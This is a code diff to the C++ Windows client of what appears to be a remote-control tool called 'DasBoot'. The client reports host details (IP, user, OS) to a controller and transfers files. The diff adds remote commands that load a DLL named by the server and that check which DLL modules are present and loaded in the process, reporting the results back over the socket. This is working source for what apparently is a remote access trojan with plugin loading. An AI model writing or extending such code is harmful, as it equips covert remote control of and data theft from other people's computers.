@@ -10,12 +10,17 @@
 #include <stdio.h>
 #include <strsafe.h>
 #include <assert.h>
+#include <Tlhelp32.h>
+#include <Psapi.h>
 
+#include "LoadDll.h"
 
 #define IP_STRING_LENGTH 16
 #define USER_NAME_LENGTH 200
 #define RUNNING_TIME_LENGTH 200
 #define OS_INFO_LENGTH 256
+
+#define MSG_ELEMENT_DELM '\1'
 
 //using namespace std;
 #pragma comment(lib, "Advapi32.lib") //for GetUserName()
@@ -27,10 +32,13 @@ static int DBBRGiveClientFileR(const char *strParam, int nMsgLength, SOCKET hSoc
 static int DBBRTransClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO);
 static int DBBRCloseClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO);
 static int DBBRGetClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO);
+static int DBBRReconModuleStateR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO);
+static int DBBRLoadClientModuleR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO);
 
-static char** str_split(char* a_str, const char a_delim);
+
 static int TransferFile(SOCKET hSocket, const char *szFileName, const char *szMsgType);
 
+static char** str_split(char* a_str, const char a_delim);
 
 
 static DWORD GetExternalIPThreadFunc(LPVOID lpParam);
@@ -81,6 +89,10 @@ int AddBasicReplToMapFunctions()
   g_mapFunctions["TranClientFileC"] = (pfnDBExportClient)DBBRTransClientFileR;
   g_mapFunctions["ClosClientFileC"] = (pfnDBExportClient)DBBRCloseClientFileR;
   g_mapFunctions["GetClientFile0C"] = (pfnDBExportClient)DBBRGetClientFileR;
+  g_mapFunctions["ReconModuleStaC"] = (pfnDBExportClient)DBBRReconModuleStateR;
+  g_mapFunctions["LoadClientModuC"] = (pfnDBExportClient)DBBRLoadClientModuleR;
+
+
 
 
   return 0;
@@ -125,7 +137,7 @@ int DBBRClientListInfoQueryR(const char *strParam, int nMsgLength, SOCKET hSocke
   }
 
   //总结
-  char chSep = '\1';
+  char chSep = MSG_ELEMENT_DELM;
   char szClientListInfoSum[IP_STRING_LENGTH + OS_INFO_LENGTH + USER_NAME_LENGTH
     + RUNNING_TIME_LENGTH];
 
@@ -399,7 +411,7 @@ int DBBRGiveClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketClie
   char *pszServerFileInfo = new char[nMsgLength];
 
   char** tokens;
-  tokens = str_split((char *)strParam, '\1');
+  tokens = str_split((char *)strParam, MSG_ELEMENT_DELM);
 
   if (tokens)
   {
@@ -444,6 +456,15 @@ int DBBRCloseClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketCli
   return 0;
 }
 
+int DBBRLoadClientModuleR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO)
+{
+  DasBootClientLoadDll(strParam);
+
+  SendMessageOut(g_hSocketClient, TEXT("LoadClientModuR"), strParam);
+
+  return 0;
+}
+
 int DBBRGetClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO)
 {
   TransferFile(g_hSocketClient, strParam, _T("GetClientFile0R"));
@@ -451,15 +472,136 @@ int DBBRGetClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketClien
   return 0;
 }
 
+int DBBRReconModuleStateR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO)
+{
+  bool bIsModuleFileExist = false;
+  bool bIsModuleFileLoaded = false;
+
+  char szPath[MAXBYTE] = { 0 };
+
+  DWORD dwRet = GetModuleFileName(NULL, szPath, MAXBYTE);
+
+  char szDrive[_MAX_DRIVE];
+  char szDir[_MAX_DIR];
+  char szFname[_MAX_FNAME];
+  char szExt[_MAX_EXT];
+
+  _splitpath(szPath, szDrive, szDir, szFname, szExt);
+
+  char szDirectoryToEnum[MAXBYTE];
+
+  sprintf(szDirectoryToEnum, "%s%s*.dll", szDrive, szDir);
+
+  WIN32_FIND_DATA FindFileData;
+  HANDLE hFind;
+
+  hFind = FindFirstFile(szDirectoryToEnum, &FindFileData);
+
+  while (hFind != INVALID_HANDLE_VALUE)
+  {
+    if (strcmp(strParam, FindFileData.cFileName) == 0)
+    {
+      bIsModuleFileExist = true;
+      break;
+    }
+
+    if (!FindNextFile(hFind, &FindFileData))
+    {
+      break;
+    }
+  }
+
+  if (hFind != INVALID_HANDLE_VALUE)
+  {
+    FindClose(hFind);
+  }
+
+  // 打开进程
+  HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 
+    FALSE, getpid());
+  // 确定保存模块句柄的数组大小
+  HMODULE hModules[0x1000] = { 0 }; // 模块数组
+  DWORD   cbNeed = 0;   // 实际获取的大小
+  EnumProcessModulesEx(  /* 枚举进程模块 */
+    hProcess,            // 进程句柄
+    hModules,            // 模块句柄数组
+    sizeof(hModules),    // 模块句柄数组的大小
+    &cbNeed,             // 实际需要的数组大小
+    LIST_MODULES_ALL);   // 枚举模块的类型
+  
+  // 获取模块句柄表
+  DWORD    dwModCount = cbNeed / sizeof(HMODULE);  // 模块数量
+  HMODULE* pModBuf = new HMODULE[dwModCount]; // 保存模块句柄的缓存
+  EnumProcessModulesEx(  /* 枚举进程模块 */
+    hProcess,                   // 进程句柄
+    pModBuf,                    // 模块句柄数组
+    dwModCount * sizeof(HMODULE), // 模块句柄数组的大小
+    &cbNeed,                    // 实际需要的数组大小
+    LIST_MODULES_ALL);          // 枚举模块的类型
+
+  MODULEENTRY32 stcMod32 = { sizeof(MODULEENTRY32) };
+  CString strTmp;
+
+  for (UINT i = 0; i < dwModCount; i++)
+  {
+    GetModuleFileNameEx(hProcess, pModBuf[i], stcMod32.szExePath, MAX_PATH);
+    _splitpath(stcMod32.szExePath, szDrive, szDir, szFname, szExt);
+
+    strTmp.Format("%s%s", szFname, szExt);
+
+    if (strcmp(strParam, strTmp.GetBuffer(0)) == 0)
+    {
+      bIsModuleFileLoaded = true;
+      break;
+    }
+  }
+
+  CloseHandle(hProcess);
+
+  CString strStatusIsModuleFileExist;
+  if (bIsModuleFileExist == true)
+  {
+    strStatusIsModuleFileExist.Format("%s", _T("是"));
+  }
+  else
+  {
+    strStatusIsModuleFileExist.Format("%s", _T("否"));
+  }
+
+  CString strStatusIsModuleLoaded;
+  if (bIsModuleFileLoaded == true)
+  {
+    strStatusIsModuleLoaded.Format("%s", _T("是"));
+  }
+  else
+  {
+    strStatusIsModuleLoaded.Format("%s", _T("否"));
+  }
+
+  CString strMsg;
+
+  strMsg.Format("%s%c%s%c%s", strParam, MSG_ELEMENT_DELM,
+    strStatusIsModuleFileExist.GetBuffer(0), MSG_ELEMENT_DELM, 
+    strStatusIsModuleLoaded.GetBuffer(0));
+
+  SendMessageOut(g_hSocketClient, TEXT("ReconModuleStaR"), strMsg.GetBuffer(0));
+
+  return 0;
+}
+
 int DBBRTransClientFileR(const char *strParam, int nMsgLength, SOCKET hSocketClient, pfnSendMessageOut pfnSMO)
 {
-  char szCurrentCount[256];
+  //char szCurrentCount[256];
   fwrite(strParam, 1, nMsgLength - 4 - 16, g_pCurrentFile);
 
   g_nFileChunckCount++;
-  sprintf(szCurrentCount, "%d", g_nFileChunckCount);
 
-  SendMessageOut(g_hSocketClient, TEXT("TranClientFileR"), szCurrentCount);
+  CString strCount;
+  strCount.Format("%d", g_nFileChunckCount);
+  //sprintf(szCurrentCount, "%d", g_nFileChunckCount);
+
+  SendMessageOut(g_hSocketClient, TEXT("TranClientFileR"),
+    /*szCurrentCount*/strCount.GetBuffer(0));
 
   return 0;
 }
